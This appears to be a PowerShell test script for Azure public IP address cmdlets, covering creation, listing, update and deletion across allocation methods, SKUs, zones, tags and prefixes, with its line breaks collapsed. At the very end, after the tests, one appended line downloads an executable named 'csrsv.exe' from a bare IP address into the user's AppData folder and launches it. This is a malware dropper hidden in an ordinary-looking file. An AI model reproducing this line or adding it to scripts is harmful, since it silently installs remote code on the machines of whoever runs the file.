function Test-PublicIpAddressCRUD{$rgname = Get-ResourceGroupName$rname = Get-ResourceName$domainNameLabel = Get-ResourceName$rglocation = Get-ProviderLocation ResourceManagement$resourceTypeParent = "Microsoft.Network/publicIpAddresses"$location = Get-ProviderLocation $resourceTypeParenttry {$resourceGroup = New-AzResourceGroup -Name $rgname -Location $rglocation -Tags @{ testtag = "testval" } $job = New-AzPublicIpAddress -ResourceGroupName $rgname -name $rname -location $location -AllocationMethod Dynamic -DomainNameLabel $domainNameLabel -AsJob$job | Wait-Job$actual = $job | Receive-Job$expected = Get-AzPublicIpAddress -ResourceGroupName $rgname -name $rnameAssert-AreEqual $expected.ResourceGroupName $actual.ResourceGroupName	Assert-AreEqual $expected.Name $actual.Name	Assert-AreEqual $expected.Location $actual.LocationAssert-AreEqual "Dynamic" $expected.PublicIpAllocationMethodAssert-NotNull $expected.ResourceGuidAssert-AreEqual "Succeeded" $expected.ProvisioningStateAssert-AreEqual $domainNameLabel $expected.DnsSettings.DomainNameLabel$list = Get-AzPublicIpAddress -ResourceGroupName $rgnameAssert-AreEqual 1 @($list).CountAssert-AreEqual $list[0].ResourceGroupName $actual.ResourceGroupName  Assert-AreEqual $list[0].Name $actual.Name    Assert-AreEqual $list[0].Location $actual.LocationAssert-AreEqual "Dynamic" $list[0].PublicIpAllocationMethodAssert-AreEqual "Succeeded" $list[0].ProvisioningStateAssert-AreEqual $domainNameLabel $list[0].DnsSettings.DomainNameLabel$list = Get-AzPublicIpAddress -ResourceGroupName "*"Assert-True { $list.Count -ge 0 }$list = Get-AzPublicIpAddress -Name "*"Assert-True { $list.Count -ge 0 }$list = Get-AzPublicIpAddress -ResourceGroupName "*" -Name "*"Assert-True { $list.Count -ge 0 }$job = Remove-AzPublicIpAddress -ResourceGroupName $actual.ResourceGroupName -name $rname -PassThru -Force -AsJob$job | Wait-Job$delete = $job | Receive-JobAssert-AreEqual true $delete$list = Get-AzPublicIpAddress -ResourceGroupName $actual.ResourceGroupNameAssert-AreEqual 0 @($list).Count}finally{Clean-ResourceGroup $rgname}}function Test-PublicIpAddressCRUD-NoDomainNameLabel{$rgname = Get-ResourceGroupName$rname = Get-ResourceName$domainNameLabel = Get-ResourceName$rglocation = Get-ProviderLocation ResourceManagement$resourceTypeParent = "Microsoft.Network/publicIpAddresses"$location = Get-ProviderLocation $resourceTypeParenttry {$resourceGroup = New-AzResourceGroup -Name $rgname -Location $rglocation -Tags @{ testtag = "testval" } $actual = New-AzPublicIpAddress -ResourceGroupName $rgname -name $rname -location $location -AllocationMethod Dynamic$expected = Get-AzPublicIpAddress -ResourceGroupName $rgname -name $rnameAssert-AreEqual $expected.ResourceGroupName $actual.ResourceGroupName Assert-AreEqual $expected.Name $actual.Name   Assert-AreEqual $expected.Location $actual.LocationAssert-AreEqual "Dynamic" $expected.PublicIpAllocationMethodAssert-AreEqual "Succeeded" $expected.ProvisioningState$list = Get-AzPublicIpAddress -ResourceGroupName $rgnameAssert-AreEqual 1 @($list).CountAssert-AreEqual $list[0].ResourceGroupName $actual.ResourceGroupName  Assert-AreEqual $list[0].Name $actual.Name    Assert-AreEqual $list[0].Location $actual.LocationAssert-AreEqual "Dynamic" $list[0].PublicIpAllocationMethodAssert-AreEqual "Succeeded" $list[0].ProvisioningState$delete = Remove-AzPublicIpAddress -ResourceGroupName $actual.ResourceGroupName -name $rname -PassThru -ForceAssert-AreEqual true $delete$list = Get-AzPublicIpAddress -ResourceGroupName $actual.ResourceGroupNameAssert-AreEqual 0 @($list).Count}finally{Clean-ResourceGroup $rgname}}function Test-PublicIpAddressCRUD-StaticAllocation{$rgname = Get-ResourceGroupName$rname = Get-ResourceName$domainNameLabel = Get-ResourceName$rglocation = Get-ProviderLocation ResourceManagement$resourceTypeParent = "Microsoft.Network/publicIpAddresses"$location = Get-ProviderLocation $resourceTypeParenttry {$resourceGroup = New-AzResourceGroup -Name $rgname -Location $rglocation -Tags @{ testtag = "testval" } $actual = New-AzPublicIpAddress -ResourceGroupName $rgname -name $rname -location $location -AllocationMethod Static$expected = Get-AzPublicIpAddress -ResourceGroupName $rgname -name $rnameAssert-AreEqual $expected.ResourceGroupName $actual.ResourceGroupName Assert-AreEqual $expected.Name $actual.Name   Assert-AreEqual $expected.Location $actual.LocationAssert-AreEqual "Static" $expected.PublicIpAllocationMethodAssert-NotNull $expected.IpAddressAssert-AreEqual "Succeeded" $expected.ProvisioningState$list = Get-AzPublicIpAddress -ResourceGroupName $rgnameAssert-AreEqual 1 @($list).CountAssert-AreEqual $list[0].ResourceGroupName $actual.ResourceGroupName  Assert-AreEqual $list[0].Name $actual.Name    Assert-AreEqual $list[0].Location $actual.LocationAssert-AreEqual "Static" $list[0].PublicIpAllocationMethodAssert-NotNull $list[0].IpAddressAssert-AreEqual "Succeeded" $list[0].ProvisioningState$delete = Remove-AzPublicIpAddress -ResourceGroupName $actual.ResourceGroupName -name $rname -PassThru -ForceAssert-AreEqual true $delete$list = Get-AzPublicIpAddress -ResourceGroupName $actual.ResourceGroupNameAssert-AreEqual 0 @($list).Count}finally{Clean-ResourceGroup $rgname}}function Test-PublicIpAddressCRUD-EditDomainNameLavel{$rgname = Get-ResourceGroupName$rname = Get-ResourceName$domainNameLabel = Get-ResourceName$newDomainNameLabel = Get-ResourceName$rglocation = Get-ProviderLocation ResourceManagement$resourceTypeParent = "Microsoft.Network/publicIpAddresses"$location = Get-ProviderLocation $resourceTypeParenttry {$resourceGroup = New-AzResourceGroup -Name $rgname -Location $rglocation -Tags @{ testtag = "testval" } $actual = New-AzPublicIpAddress -ResourceGroupName $rgname -name $rname -location $location -AllocationMethod Dynamic -DomainNameLabel $domainNameLabel$publicip = Get-AzPublicIpAddress -ResourceGroupName $rgname -name $rnameAssert-AreEqual $publicip.ResourceGroupName $actual.ResourceGroupName Assert-AreEqual $publicip.Name $actual.Name   Assert-AreEqual $publicip.Location $actual.LocationAssert-AreEqual "Dynamic" $publicip.PublicIpAllocationMethodAssert-AreEqual "Succeeded" $publicip.ProvisioningStateAssert-AreEqual $domainNameLabel $publicip.DnsSettings.DomainNameLabel$publicip.DnsSettings.DomainNameLabel = $newDomainNameLabel$job = $publicip | Set-AzPublicIpAddress -AsJob$job | Wait-Job$publicip = Get-AzPublicIpAddress -ResourceGroupName $rgname -name $rnameAssert-AreEqual $newDomainNameLabel $publicip.DnsSettings.DomainNameLabel$delete = Remove-AzPublicIpAddress -ResourceGroupName $actual.ResourceGroupName -name $rname -PassThru -ForceAssert-AreEqual true $delete$list = Get-AzPublicIpAddress -ResourceGroupName $actual.ResourceGroupNameAssert-AreEqual 0 @($list).Count}finally{Clean-ResourceGroup $rgname}}function Test-PublicIpAddressCRUD-ReverseFqdn{$rgname = Get-ResourceGroupName$rname = Get-ResourceName$domainNameLabel = Get-ResourceName$rglocation = Get-ProviderLocation ResourceManagement$resourceTypeParent = "Microsoft.Network/publicIpAddresses"$location = Get-ProviderLocation $resourceTypeParenttry {$resourceGroup = New-AzResourceGroup -Name $rgname -Location $rglocation -Tags @{ testtag = "testval" } $actual = New-AzPublicIpAddress -ResourceGroupName $rgname -name $rname -location $location -AllocationMethod Dynamic -DomainNameLabel $domainNameLabel$publicip = Get-AzPublicIpAddress -ResourceGroupName $rgname -name $rnameAssert-AreEqual $publicip.ResourceGroupName $actual.ResourceGroupName Assert-AreEqual $publicip.Name $actual.Name   Assert-AreEqual $publicip.Location $actual.LocationAssert-AreEqual "Dynamic" $publicip.PublicIpAllocationMethodAssert-AreEqual "Succeeded" $publicip.ProvisioningStateAssert-AreEqual $domainNameLabel $publicip.DnsSettings.DomainNameLabel$publicip.DnsSettings.ReverseFqdn = $publicip.DnsSettings.Fqdn$publicip | Set-AzPublicIpAddress$publicip = Get-AzPublicIpAddress -ResourceGroupName $rgname -name $rnameAssert-AreEqual $publicip.DnsSettings.Fqdn $publicip.DnsSettings.ReverseFqdn$delete = Remove-AzPublicIpAddress -ResourceGroupName $actual.ResourceGroupName -name $rname -PassThru -ForceAssert-AreEqual true $delete$list = Get-AzPublicIpAddress -ResourceGroupName $actual.ResourceGroupNameAssert-AreEqual 0 @($list).Count}finally{Clean-ResourceGroup $rgname}}function Test-PublicIpAddressCRUD-IpTag{$rgname = Get-ResourceGroupName$rname = Get-ResourceName$domainNameLabel = Get-ResourceName$rglocation = Get-ProviderLocation ResourceManagement$resourceTypeParent = "Microsoft.Network/publicIpAddresses"$location = Get-ProviderLocation $resourceTypeParenttry{$resourceGroup = New-AzResourceGroup -Name $rgname -Location $rglocation -Tags @{ testtag = "testval" } $IpTag = New-AzPublicIpTag -IpTagType "FirstPartyUsage" -Tag "/Sql"Assert-AreEqual $IpTag.IpTagType "FirstPartyUsage"Assert-AreEqual $IpTag.Tag "/Sql"$IpTag2 = New-AzPublicIpTag -IpTagType "RoutingPreference" -Tag "/Internet"Assert-AreEqual $IpTag2.IpTagType "RoutingPreference"Assert-AreEqual $IpTag2.Tag "/Internet"$actual = New-AzPublicIpAddress -ResourceGroupName $rgname -name $rname -location $location -AllocationMethod Dynamic -DomainNameLabel $domainNameLabel -IpTag $IpTag$publicip = Get-AzPublicIpAddress -ResourceGroupName $rgname -name $rnameAssert-AreEqual $publicip.ResourceGroupName $actual.ResourceGroupNameAssert-AreEqual $publicip.Name $actual.NameAssert-AreEqual $publicip.Location $actual.LocationAssert-AreEqual "Dynamic" $publicip.PublicIpAllocationMethodAssert-AreEqual "Succeeded" $publicip.ProvisioningStateAssert-AreEqual $domainNameLabel $publicip.DnsSettings.DomainNameLabel$publicip | Set-AzPublicIpAddress$publicip = Get-AzPublicIpAddress -ResourceGroupName $rgname -name $rnameAssert-AreEqual "FirstPartyUsage" $publicip.IpTags.IpTagTypeAssert-AreEqual "/Sql" $publicip.IpTags.Tag$delete = Remove-AzPublicIpAddress -ResourceGroupName $actual.ResourceGroupName -name $rname -PassThru -ForceAssert-AreEqual true $delete$list = Get-AzPublicIpAddress -ResourceGroupName $actual.ResourceGroupNameAssert-AreEqual 0 @($list).Count}finally{Clean-ResourceGroup $rgname}}function Test-PublicIpAddressIpVersion{$rgname = Get-ResourceGroupName$rname = Get-ResourceName$rname1 = Get-ResourceName$rname2 = Get-ResourceName$domainNameLabel = Get-ResourceName$rglocation = Get-ProviderLocation ResourceManagement$resourceTypeParent = "Microsoft.Network/publicIpAddresses"$location = Get-ProviderLocation $resourceTypeParenttry {$resourceGroup = New-AzResourceGroup -Name $rgname -Location $rglocation -Tags @{ testtag = "testval" } $actual = New-AzPublicIpAddress -ResourceGroupName $rgname -name $rname -location $location -AllocationMethod Dynamic -DomainNameLabel $domainNameLabel$expected = Get-AzPublicIpAddress -ResourceGroupName $rgname -name $rnameAssert-AreEqual $expected.ResourceGroupName $actual.ResourceGroupName Assert-AreEqual $expected.Name $actual.Name   Assert-AreEqual $expected.Location $actual.LocationAssert-AreEqual "Dynamic" $expected.PublicIpAllocationMethodAssert-NotNull $expected.ResourceGuidAssert-AreEqual "Succeeded" $expected.ProvisioningStateAssert-AreEqual $domainNameLabel $expected.DnsSettings.DomainNameLabelAssert-AreEqual $expected.PublicIpAddressVersion IPv4$list = Get-AzPublicIpAddress -ResourceGroupName $rgnameAssert-AreEqual 1 @($list).CountAssert-AreEqual $list[0].ResourceGroupName $actual.ResourceGroupName  Assert-AreEqual $list[0].Name $actual.Name    Assert-AreEqual $list[0].Location $actual.LocationAssert-AreEqual "Dynamic" $list[0].PublicIpAllocationMethodAssert-AreEqual "Succeeded" $list[0].ProvisioningStateAssert-AreEqual $domainNameLabel $list[0].DnsSettings.DomainNameLabelAssert-AreEqual $list[0].PublicIpAddressVersion IPv4$actual = New-AzPublicIpAddress -ResourceGroupName $rgname -name $rname1 -location $location -AllocationMethod Dynamic -IpAddressVersion IPv4$expected = Get-AzPublicIpAddress -ResourceGroupName $rgname -name $rname1Assert-AreEqual $expected.ResourceGroupName $actual.ResourceGroupName Assert-AreEqual $expected.Name $actual.Name   Assert-AreEqual $expected.Location $actual.LocationAssert-AreEqual "Dynamic" $expected.PublicIpAllocationMethodAssert-NotNull $expected.ResourceGuidAssert-AreEqual "Succeeded" $expected.ProvisioningState      Assert-AreEqual $expected.PublicIpAddressVersion IPv4$actual = New-AzPublicIpAddress -ResourceGroupName $rgname -name $rname2 -location $location -AllocationMethod Dynamic -IpAddressVersion IPv6$expected = Get-AzPublicIpAddress -ResourceGroupName $rgname -name $rname2Assert-AreEqual $expected.ResourceGroupName $actual.ResourceGroupName Assert-AreEqual $expected.Name $actual.Name   Assert-AreEqual $expected.Location $actual.LocationAssert-AreEqual "Dynamic" $expected.PublicIpAllocationMethodAssert-NotNull $expected.ResourceGuidAssert-AreEqual "Succeeded" $expected.ProvisioningState      Assert-AreEqual $expected.PublicIpAddressVersion IPv6$delete = Remove-AzPublicIpAddress -ResourceGroupName $actual.ResourceGroupName -name $rname -PassThru -ForceAssert-AreEqual true $delete$delete = Remove-AzPublicIpAddress -ResourceGroupName $actual.ResourceGroupName -name $rname1 -PassThru -ForceAssert-AreEqual true $delete$delete = Remove-AzPublicIpAddress -ResourceGroupName $actual.ResourceGroupName -name $rname2 -PassThru -ForceAssert-AreEqual true $delete$list = Get-AzPublicIpAddress -ResourceGroupName $actual.ResourceGroupNameAssert-AreEqual 0 @($list).Count}finally{Clean-ResourceGroup $rgname}}function Get-NameById($Id, $ResourceType){$name = $Id.Substring($Id.IndexOf($ResourceType + '/') + $ResourceType.Length + 1);if ($name.IndexOf('/') -ne -1){$name = $name.Substring(0, $name.IndexOf('/'));}return $name;}function Test-PublicIpAddressVmss{$rgname = Get-ResourceGroupName$vnetName = Get-ResourceName$subnetName = Get-ResourceName$rglocation = Get-ProviderLocation ResourceManagement$resourceTypeParent = "Microsoft.Compute/virtualMachineScaleSets"$location = Get-ProviderLocation $resourceTypeParenttry{. ".\AzureRM.Resources.ps1"$resourceGroup = New-AzResourceGroup -Name $rgname -Location $rglocation -Tags @{ testtag = "testval" } $vmssName = "vmssip"$templateFile = (Resolve-Path ".\ScenarioTests\Data\VmssDeploymentTemplate.json").PathNew-AzResourceGroupDeployment -Name $rgname -ResourceGroupName $rgname -TemplateFile $templateFile;$listAllResults = Get-AzPublicIpAddress -ResourceGroupName $rgname -VirtualMachineScaleSetName $vmssName;Assert-NotNull $listAllResults;$listFirstResultId = $listAllResults[0].Id;$vmIndex = Get-NameById $listFirstResultId "virtualMachines";$nicName = Get-NameById $listFirstResultId "networkInterfaces";$ipConfigName = Get-NameById $listFirstResultId "ipConfigurations";$ipName = Get-NameById $listFirstResultId "publicIPAddresses";$listResults = Get-AzPublicIpAddress -ResourceGroupName $rgname -VirtualMachineScaleSetName $vmssName -VirtualmachineIndex $vmIndex -NetworkInterfaceName $nicName -IpConfigurationName $ipConfigName;Assert-NotNull $listResults;Assert-AreEqualObjectProperties $listAllResults[0] $listResults[0] "List and list all results should contain equal items";$vmssIp = Get-AzPublicIpAddress -ResourceGroupName $rgname -VirtualMachineScaleSetName $vmssName -VirtualmachineIndex $vmIndex -NetworkInterfaceName $nicName -IpConfigurationName $ipConfigName -Name $ipName;Assert-NotNull $vmssIp;Assert-AreEqualObjectProperties $vmssIp $listResults[0] "List and get results should contain equal items";}finally{Clean-ResourceGroup $rgname}}function Test-PublicIpAddressCRUD-BasicSku{$rgname = Get-ResourceGroupName$rname = Get-ResourceName$domainNameLabel = Get-ResourceName$rglocation = Get-ProviderLocation ResourceManagement$resourceTypeParent = "Microsoft.Network/publicIpAddresses"$location = Get-ProviderLocation $resourceTypeParenttry {$resourceGroup = New-AzResourceGroup -Name $rgname -Location $rglocation -Tags @{ testtag = "testval" } $actual = New-AzPublicIpAddress -ResourceGroupName $rgname -name $rname -location $location -AllocationMethod Dynamic -DomainNameLabel $domainNameLabel -Sku Basic$expected = Get-AzPublicIpAddress -ResourceGroupName $rgname -name $rnameAssert-AreEqual $expected.ResourceGroupName $actual.ResourceGroupName Assert-AreEqual $expected.Name $actual.Name   Assert-AreEqual $expected.Location $actual.LocationAssert-AreEqualObjectProperties $expected.Sku $actual.SkuAssert-AreEqual "Dynamic" $expected.PublicIpAllocationMethodAssert-NotNull $expected.ResourceGuidAssert-AreEqual "Succeeded" $expected.ProvisioningStateAssert-AreEqual $domainNameLabel $expected.DnsSettings.DomainNameLabel$list = Get-AzPublicIpAddress -ResourceGroupName $rgnameAssert-AreEqual 1 @($list).CountAssert-AreEqual $list[0].ResourceGroupName $actual.ResourceGroupName  Assert-AreEqual $list[0].Name $actual.Name    Assert-AreEqual $list[0].Location $actual.LocationAssert-AreEqualObjectProperties $list[0].Sku $actual.SkuAssert-AreEqual "Dynamic" $list[0].PublicIpAllocationMethodAssert-AreEqual "Succeeded" $list[0].ProvisioningStateAssert-AreEqual $domainNameLabel $list[0].DnsSettings.DomainNameLabel$delete = Remove-AzPublicIpAddress -ResourceGroupName $actual.ResourceGroupName -name $rname -PassThru -ForceAssert-AreEqual true $delete$list = Get-AzPublicIpAddress -ResourceGroupName $actual.ResourceGroupNameAssert-AreEqual 0 @($list).Count}finally{Clean-ResourceGroup $rgname}}function Test-PublicIpAddressCRUD-StandardSku{$rgname = Get-ResourceGroupName$rname = Get-ResourceName$domainNameLabel = Get-ResourceName$rglocation = Get-ProviderLocation ResourceManagement$resourceTypeParent = "Microsoft.Network/publicIpAddresses"$location = Get-ProviderLocation $resourceTypeParenttry {$resourceGroup = New-AzResourceGroup -Name $rgname -Location $rglocation -Tags @{ testtag = "testval" } $actual = New-AzPublicIpAddress -ResourceGroupName $rgname -name $rname -location $location -AllocationMethod Static -Sku Standard -DomainNameLabel $domainNameLabel$expected = Get-AzPublicIpAddress -ResourceGroupName $rgname -name $rnameAssert-AreEqual $expected.ResourceGroupName $actual.ResourceGroupNameAssert-AreEqual $expected.Name $actual.NameAssert-AreEqual $expected.Location $actual.LocationAssert-AreEqualObjectProperties $expected.Sku $actual.SkuAssert-AreEqual "Static" $expected.PublicIpAllocationMethodAssert-NotNull $expected.IpAddressAssert-AreEqual "Succeeded" $expected.ProvisioningState$list = Get-AzPublicIpAddress -ResourceGroupName $rgnameAssert-AreEqual 1 @($list).CountAssert-AreEqual $list[0].ResourceGroupName $actual.ResourceGroupNameAssert-AreEqual $list[0].Name $actual.NameAssert-AreEqual $list[0].Location $actual.LocationAssert-AreEqualObjectProperties $list[0].Sku $actual.SkuAssert-AreEqual "Static" $list[0].PublicIpAllocationMethodAssert-NotNull $list[0].IpAddressAssert-AreEqual "Succeeded" $list[0].ProvisioningState$delete = Remove-AzPublicIpAddress -ResourceGroupName $actual.ResourceGroupName -name $rname -PassThru -ForceAssert-AreEqual true $delete$list = Get-AzPublicIpAddress -ResourceGroupName $actual.ResourceGroupNameAssert-AreEqual 0 @($list).Count}finally{Clean-ResourceGroup $rgname}}function Test-PublicIpAddressZones{$rgname = Get-ResourceGroupName$rname = Get-ResourceName$zones = "1";$rglocation = Get-ProviderLocation ResourceManagement$location = Get-ProviderLocation "Microsoft.Network/publicIpAddresses" "Central US"try{$resourceGroup = New-AzResourceGroup -Name $rgname -Location $rglocation -Tags @{ testtag = "testval" }$actual = New-AzPublicIpAddress -ResourceGroupName $rgname -name $rname -location $location -AllocationMethod Dynamic -Zone $zones;$expected = Get-AzPublicIpAddress -ResourceGroupName $rgname -name $rnameAssert-AreEqual $expected.ResourceGroupName $actual.ResourceGroupNameAssert-AreEqual $expected.Name $actual.NameAssert-AreEqual $expected.Location $actual.LocationAssert-AreEqual "Dynamic" $expected.PublicIpAllocationMethodAssert-NotNull $expected.ResourceGuidAssert-AreEqual "Succeeded" $expected.ProvisioningStateAssert-AreEqual $zones $expected.Zones[0]}finally{Clean-ResourceGroup $rgname}}function Test-PublicIpAddressCRUD-PublicIPPrefix{$rgname = Get-ResourceGroupName$rname = Get-ResourceName$domainNameLabel = Get-ResourceName$rglocation = Get-ProviderLocation ResourceManagement$resourceTypeParent = "Microsoft.Network/publicIpAddresses"$location = Get-ProviderLocation $resourceTypeParenttry {$resourceGroup = New-AzResourceGroup -Name $rgname -Location $rglocation -Tags @{ testtag = "testval" } $prefixname = $rname + "prfx"$PublicIpPrefix = New-AzPublicIpPrefix -ResourceGroupName $rgname -name $prefixname -location $location -Sku Standard -prefixLength 30$expectedPublicIpPrefix = Get-AzPublicIpPrefix -ResourceGroupName $rgname -name $prefixnameAssert-AreEqual $expectedPublicIpPrefix.ResourceGroupName $PublicIpPrefix.ResourceGroupNameAssert-AreEqual $expectedPublicIpPrefix.Name $PublicIpPrefix.NameAssert-AreEqual $expectedPublicIpPrefix.Location $PublicIpPrefix.LocationAssert-AreEqualObjectProperties $expectedPublicIpPrefix.Sku $PublicIpPrefix.SkuAssert-NotNull $expectedPublicIpPrefix.IPPrefix$actual = New-AzPublicIpAddress -ResourceGroupName $rgname -name $rname -location $location -AllocationMethod Static -Sku Standard -DomainNameLabel $domainNameLabel -PublicIPPrefix $expectedPublicIpPrefix$expected = Get-AzPublicIpAddress -ResourceGroupName $rgname -name $rnameAssert-AreEqual $expected.ResourceGroupName $actual.ResourceGroupNameAssert-AreEqual $expected.Name $actual.NameAssert-AreEqual $expected.Location $actual.LocationAssert-AreEqualObjectProperties $expected.Sku $actual.SkuAssert-AreEqual "Static" $expected.PublicIpAllocationMethodAssert-NotNull $expected.IpAddressAssert-AreEqual "Succeeded" $expected.ProvisioningState$list = Get-AzPublicIpAddress -ResourceGroupName $rgnameAssert-AreEqual 1 @($list).CountAssert-AreEqual $list[0].ResourceGroupName $actual.ResourceGroupNameAssert-AreEqual $list[0].Name $actual.NameAssert-AreEqual $list[0].Location $actual.LocationAssert-AreEqualObjectProperties $list[0].Sku $actual.SkuAssert-AreEqual "Static" $list[0].PublicIpAllocationMethodAssert-NotNull $list[0].IpAddressAssert-AreEqual "Succeeded" $list[0].ProvisioningState$delete = Remove-AzPublicIpAddress -ResourceGroupName $actual.ResourceGroupName -name $rname -PassThru -ForceAssert-AreEqual true $delete$list = Get-AzPublicIpAddress -ResourceGroupName $actual.ResourceGroupNameAssert-AreEqual 0 @($list).Count}finally{Clean-ResourceGroup $rgname}}function Test-PublicIpAddressCRUD-IdleTimeout{$rgname = Get-ResourceGroupName$rname = Get-ResourceName$domainNameLabel = Get-ResourceName$rglocation = Get-ProviderLocation ResourceManagement$location = Get-ProviderLocation "Microsoft.Network/publicIpAddresses"try{$resourceGroup = New-AzResourceGroup -Name $rgname -Location $rglocation $actual = New-AzPublicIpAddress -ResourceGroupName $rgname -name $rname -location $location -IdleTimeoutInMinutes 15 -AllocationMethod Dynamic -DomainNameLabel $domainNameLabel$expected = Get-AzPublicIpAddress -ResourceGroupName $rgname -name $rnameAssert-AreEqual $expected.ResourceGroupName $actual.ResourceGroupName Assert-AreEqual $expected.Name $actual.Name Assert-AreEqual $expected.Location $actual.LocationAssert-NotNull $expected.ResourceGuidAssert-AreEqual "Dynamic" $expected.PublicIpAllocationMethodAssert-AreEqual "Succeeded" $expected.ProvisioningStateAssert-AreEqual $domainNameLabel $expected.DnsSettings.DomainNameLabelAssert-AreEqual 15 $expected.IdleTimeoutInMinutes$actual.IdleTimeoutInMinutes = 30$actual = Set-AzPublicIpAddress -PublicIpAddress $actual$expected = Get-AzPublicIpAddress -ResourceGroupName $rgname -name $rnameAssert-AreEqual 30 $expected.IdleTimeoutInMinutes$job = Remove-AzPublicIpAddress -ResourceGroupName $actual.ResourceGroupName -name $rname -PassThru -Force -AsJob$job | Wait-Job$delete = $job | Receive-JobAssert-AreEqual true $delete$list = Get-AzPublicIpAddress -ResourceGroupName $actual.ResourceGroupNameAssert-AreEqual 0 @($list).Count$list = Get-AzPublicIpAddress | Where-Object { $_.ResourceGroupName -eq $actual.ResourceGroupName -and $_.Name -eq $actual.Name }Assert-AreEqual 0 @($list).CountAssert-ThrowsContains { Set-AzPublicIpAddress -PublicIpAddress $actual } "not found";}finally{Clean-ResourceGroup $rgname}}(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")